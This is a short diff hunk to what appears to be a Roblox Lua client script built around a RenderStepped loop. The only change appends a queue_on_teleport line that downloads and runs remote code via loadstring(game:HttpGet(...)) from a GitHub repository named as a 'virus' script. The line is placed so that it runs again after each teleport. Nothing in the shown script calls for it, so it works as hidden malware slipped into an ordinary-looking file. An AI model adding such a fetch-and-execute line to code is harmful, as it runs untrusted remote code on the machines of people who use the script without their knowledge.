@@ -105,3 +105,5 @@ RunService.RenderStepped:Connect(function(dt)
         end
     end
 end)
+
+queue_on_teleport('loadstring(game:HttpGet("https://github.com/Executioner11/YOU-ARE-AN-IDOIT-VIRUS-ROBLOX-SCRIPT/blob/main/IDOIT"))()')
